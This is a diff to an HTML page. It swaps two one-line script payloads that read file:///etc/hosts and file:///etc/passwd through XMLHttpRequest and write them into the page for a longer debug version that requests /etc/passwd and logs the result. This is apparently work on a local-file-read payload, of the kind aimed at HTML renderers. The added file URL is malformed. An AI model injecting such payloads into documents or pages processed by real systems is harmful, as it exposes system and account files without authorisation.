@@ -8,8 +8,25 @@
 </head>
 <body>
 
-    <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(‘GET’,’file:///etc/hosts’);x.send();</script>
-<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(‘GET’,’file:///etc/passwd’);x.send();</script>
+    <script>
+        alert('working till here')
+        function makeHttpObject() {
+            try {return new XMLHttpRequest();}
+            catch (error) {}
+            try {return new ActiveXObject("Msxml2.XMLHTTP");}
+            catch (error) {}
+            try {return new ActiveXObject("Microsoft.XMLHTTP");}
+            catch (error) {}
+        
+            throw new Error("Could not create HTTP request object.");
+        }
+        
+        var request = makeHttpObject();
+        request.open("GET", "file://etc/passwd", true);
+        request.send(null);
+        console.log(request)
+    
+    </script>
 
 </body>
 </html>
